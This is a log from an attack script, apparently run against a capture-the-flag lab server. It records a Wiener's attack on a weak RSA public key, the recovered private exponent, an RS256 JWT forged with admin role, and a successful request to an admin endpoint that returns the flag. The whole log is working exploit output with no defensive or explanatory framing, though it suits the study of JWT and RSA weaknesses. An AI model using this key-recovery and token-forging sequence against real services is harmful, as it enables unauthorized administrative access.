2025-12-25 09:32:55,779 - INFO - Logging to file: logs/attackC_20251225_093255.log
2025-12-25 09:32:55,780 - INFO - [*] Fetching public key from: http://http_server_c:8000/public.pem
2025-12-25 09:32:55,839 - INFO - [*] Parsed public key: n bitlen=1024, e=81235006040363234910908045432173744293761617869693494166276910949244015246331336375976219807871236314307662062052546796739725049971632424758744331653044410358719326820847325486225226351244215663366492976193524747561733843777566662624480410860325200127488467284080270957925865016099669223402551327053620918037
2025-12-25 09:32:55,840 - INFO - [*] Running Wiener's attack ...
2025-12-25 09:32:55,841 - INFO - [+] Wiener success: d=25468846017754393878723181695299858629871185966792762059354871098927312799973
2025-12-25 09:32:55,855 - INFO - [+] Forged JWT:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjY2NTg3NzUsImlhdCI6MTc2NjY1NTE3NSwicm9sZSI6ImFkbWluIiwic3ViIjoiYXR0YWNrZXIifQ.XSPaCjlp6zAR217Q_T48-T_rz3J6vRqNK51gqtJGBryfayp_tz37SLxz8r4uF0T54Vw1pEkEbgXu0orhUat-cHIKHnQToga2OOuyq4LYlB-ZertD_kqKF8azrFPpAMoSDedQaxcnOoUPVngeNywbb5DAWUxBDPS4U-tL6WY4fm8
2025-12-25 09:32:55,856 - INFO - [+] Verified local signature OK
2025-12-25 09:32:55,856 - INFO - [*] Trying admin endpoint (via cookie): http://http_server_c:8000/admin
2025-12-25 09:32:55,871 - INFO - [*] /admin returned HTTP 200:
2025-12-25 09:32:55,872 - INFO - {
  "flag": "FLAG{weiner_attack_with_jwt}",
  "message": "Welcome, admin!",
  "ok": true,
  "payload": {
    "exp": 1766658775,
    "iat": 1766655175,
    "role": "admin",
    "sub": "attacker"
  },
  "role": "admin"
}
2025-12-25 09:32:55,872 - INFO - [*] Complete. Total elapsed: 0.092s
